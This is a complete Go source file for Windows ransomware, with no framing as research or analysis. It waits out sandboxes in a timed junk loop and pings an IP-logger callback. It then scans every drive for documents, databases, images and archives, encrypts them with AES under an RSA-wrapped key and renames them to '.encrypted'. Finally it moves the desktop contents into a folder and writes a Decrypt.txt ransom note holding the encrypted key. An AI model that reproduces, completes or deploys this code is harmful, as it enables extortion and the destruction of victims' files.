package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha512"
	"crypto/x509"
	"encoding/base64"
	"encoding/pem"
	"github.com/rodolfoag/gow32"
	"io"
	"io/ioutil"
	"log"
	xMath "math/rand"
	"net/http"
	"os"
	"os/user"
	"path"
	"path/filepath"
	"runtime"
	"strconv"
	"sync"
	"time"
)


const BuildID = "rGZucHXvtU"

type AsymmetricPubKey string
var PoolSize = runtime.NumCPU()
const EncodedPubKey AsymmetricPubKey = "LS0tLS1CRUdJTiBSU0EgUFVCTElDIEtFWS0tLS0tCk1JSUNJakFOQmdrcWhraUc5dzBCQVFFRkFBT0NBZzhBTUlJQ0NnS0NBZ0VBeCtPeDhsRFBuaUFiT2hWUy9GaE4Kdyt0dnpPU1g5ZEg0eGUwYS9UTDlGTzZqWUZnc2NqYnZPUXBDZWtTL3lCbHNVSTBZSFc0dHVhUkR2a1RVTGhnTAowWDdHbDd4M2hSOG41S2pvMC9CYkFEVTQyU08vc3NZM0JpZlQyc0NGbDM2S05aQ0dxY3ZLc1A0aUR6dEgxeXBICit5cDlsb2JJT0N2dzBUSzJUdU1uNjJiL1BJcjBQeDlKVU92ajNpcThycm5wWEZTa3pLNUVIaEQ4eWJoeG91RGYKQnB6dVhzMklNZjhaYVFNNHdNNm1DbEs2MFpZdTZFSnNhRUNlTzFYakJhNDVIV20vT1lueGxGbzdHWUc5THArZgpkdy80aUc4MjZsbzc5SWFIaXUwdEJjWllVMWEyZ2FGOW12QUdlc01YYUNqQmN4U21YaXhwU2ZFUWw1OTVtR0s2CjdaaEtLMGgvcy8xQzRwZHlabXlPcVhZS04zbHlwTk5yTWVtNENFeUh0MUFIQjJUVEp2WTd5ZEJxZ1lQMmJybncKbXpOUDdtNUZ0UDloZy9weXNjb0p5WWd5M3JCbTRKSG8xLzB2QzNvN0k3dmNpU3I3YkRZdlRVcG1KQ3pJaTh3LwpTd2N3cWMzZGRvaDZKajNIMkdldEpSdlprUmt6TEtYRktRekhWMXdIRnhRQVBDSDkyaXl6TmtVQzU5YmZBWmJ6CnR4b0hwNS9WWkN5TE5BbjRPZVBYOTVxcHQ2aTZ6ZEM2L3VxWEswODFwNkc4WENSOHlzKytSMUNtRTh5YTNHbjkKK0hJZzVLenlGYjhzNjBiVW9QekwybHo4elJ6QTdlcHdhK0c5VUFDZ1NjTy9Ca2dncHBkUnRGeXB3ZVNSbmtZcwppUDV1U0dmYVVqcWVGaHpUem5YVDJTTUNBd0VBQVE9PQotLS0tLUVORCBSU0EgUFVCTElDIEtFWS0tLS0tCg=="

func main() {

	mutexName := "CoreInstance"

	_, err := gow32.CreateMutex(mutexName)
	if err != nil {
		return
	}

	JunkCode()

	SendCallback()

	var Files []string
	var ScanGroup sync.WaitGroup

	for _ , DriveName := range GetDrives(){
		ScanGroup.Add(1)
		go func(drive string) {
			defer ScanGroup.Done()
			Files = append(Files, GetFilesFromDrive(drive)...)
		}(DriveName)
	}

	ScanGroup.Wait()

	var EncryptionKey = []byte(GenerateSymmetricKey(32))

	EncryptPool(PoolSize, &Files, &EncryptionKey)

	SuperEncryptedKey := EncryptWithPublicKey(&EncryptionKey, GetPubKey())

	RenamePool(PoolSize, &Files)

	FancyDesktop()

	CreateNote(&SuperEncryptedKey, len(Files))

}

func SendCallback(){
	http.Get("Link to ipLogger")
}

func FancyDesktop(){
	myself, error := user.Current(); if error != nil {
		panic(error)
	}
	homedir := myself.HomeDir
	desktop := homedir + "/Desktop/"

	MoveToFolder(desktop, GetFilesFromPath(desktop))
}

func GetFilesFromPath(Drive string) map[string] os.FileInfo{

	Files := make(map[string] os.FileInfo)
	err := filepath.Walk(Drive,
		func(path string, info os.FileInfo, err error) error {
			if err != nil {
				return err
			}
			Files[path] = info
			return nil
		})
	if err != nil {
		return Files
	}

	return Files
}

func MoveToFolder(UserDesktop string, Files map[string] os.FileInfo){

	os.MkdirAll(path.Join(UserDesktop, "Encrypted"), os.ModePerm)

	for k, v := range Files{
		os.Rename(k, path.Join(UserDesktop, "Encrypted", v.Name()))
	}
}

func EncryptPool(PoolSize int, Files *[]string, EncryptionKey *[]byte){

	for i , j := 0 , 0; i < len(*Files); {

		j = i
		if i + PoolSize <= len(*Files) {
			i += PoolSize
		}else{
			i += len(*Files) - j
		}

		EncryptGroup((*Files)[j:i], EncryptionKey)
	}
}

func RenamePool(PoolSize int, Files *[]string){

	for i , j := 0 , 0; i < len(*Files); {

		j = i
		if i + PoolSize <= len(*Files) {
			i += PoolSize
		}else{
			i += len(*Files) - j
		}

		RenameGroup((*Files)[j:i])
	}
}

func EncryptGroup(Files []string, EncryptionKey *[]byte){

	var EncryptGroup sync.WaitGroup

	for _, filePath := range Files{
		EncryptGroup.Add(1)
		go func(path string) {
			defer EncryptGroup.Done()
			EncryptFile(path, EncryptionKey)
		}(filePath)
	}

	EncryptGroup.Wait()
}

func RenameGroup(Files []string){

	var RenameGroup sync.WaitGroup
	for _, filePath := range Files{
		RenameGroup.Add(1)
		go func(path string) {
			defer RenameGroup.Done()
			os.Rename(path, path + ".encrypted")
		}(filePath)
	}

	RenameGroup.Wait()

}

func CreateNote(KEY *[]byte, FilesEncrypted int){


	myself, error := user.Current(); if error != nil {
		panic(error)
	}
	homedir := myself.HomeDir
	desktop := homedir + "/Desktop/"

	err := ioutil.WriteFile(desktop + "/Decrypt.txt", []byte("Encrypted files: " + strconv.Itoa(FilesEncrypted) + "\nPersonal Key: " + base64.StdEncoding.EncodeToString([]byte(base64.StdEncoding.EncodeToString([]byte(BuildID)) + (":") + base64.StdEncoding.EncodeToString(*KEY))) + "\n"), 777); if err != nil{
		return
	}

}

func EncryptFile(path string, KEY *[]byte) {

	data, err := ioutil.ReadFile(path); if err != nil {
		return
	}

	buff, err := Encrypt(KEY, data); if err != nil {
		return
	}

	ioutil.WriteFile(path, buff, 0644)
}


func JunkCode(){

	var v int
	for i:= 0; i < 30; i++{
		for k := 0; k < 2048; k++{
			v++
		}
		time.Sleep(time.Second * 1)
	}
}

func Encrypt(key *[]byte, data []byte)  ([]byte, error) {

	block, err := aes.NewCipher(*key)
	if err != nil {
		return nil, err
	}

	cipherText := make([]byte, aes.BlockSize+len(data))
	iv := cipherText[:aes.BlockSize]
	if _, err = io.ReadFull(rand.Reader, iv); err != nil {
		return nil, err
	}

	stream := cipher.NewCFBEncrypter(block, iv)
	stream.XORKeyStream(cipherText[aes.BlockSize:], data)


	return cipherText, nil
}

func GetFilesFromDrive(Drive string) []string{

	var files []string
	patterns := []string{"*.bak", "*.doс", "*.doсx", "*.txt","*.xls","*.xlsm","*.xlsx","*.jpeg","*.jpg","*.png","*.csv","*.dat","*.db","*.dbf","*.sql","*.7z","*.rar","*.zip"}

	err := filepath.Walk(Drive + ":\\", func(path string, info os.FileInfo, err error) error {

		for _ , v := range patterns{

			if matched, err := filepath.Match(v, filepath.Base(path)); err != nil {
				return err
			} else if matched {
				if info.Size() <= 104857600 && info.Name() != "Decrypt.txt"{
					files = append(files, path)
				}
			}

		}

		return nil

	})

	if err != nil {
		return files
	}

	return files
}

func GetPubKey() *rsa.PublicKey {

	buffPub, err := base64.StdEncoding.DecodeString(string(EncodedPubKey)); if err != nil{
		return nil
	}

	block, _ := pem.Decode(buffPub)
	enc := x509.IsEncryptedPEMBlock(block)
	b := block.Bytes
	if enc {
		log.Println("is encrypted pem block")
		b, err = x509.DecryptPEMBlock(block, nil)
		if err != nil {
			panic(err)
		}
	}
	ifc, err := x509.ParsePKIXPublicKey(b)
	if err != nil {
		panic(err)
	}
	key, ok := ifc.(*rsa.PublicKey)
	if !ok {
		panic("not ok")
	}
	return key
}

func EncryptWithPublicKey(data *[]byte, pub *rsa.PublicKey) []byte {
	hash := sha512.New()
	ciphertext, err := rsa.EncryptOAEP(hash, rand.Reader, pub, *data, nil)
	if err != nil {
		return nil
	}
	return ciphertext
}

func GetDrives() (driveList []string) {
	for _, drive := range "ABCDEFGHIJKLMNOPQRSTUVWXYZ" {
		f, err := os.Open(string(drive) + ":\\")
		if err == nil {
			driveList = append(driveList, string(drive))
			f.Close()
		}
	}
	return
}


const letterBytes = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ01234567890"

func GenerateSymmetricKey(n int) string {
	xMath.Seed(time.Now().UnixNano())
	b := make([]byte, n)
	for i := range b {
		b[i] = letterBytes[xMath.Intn(len(letterBytes))]
	}
	return string(b)
}
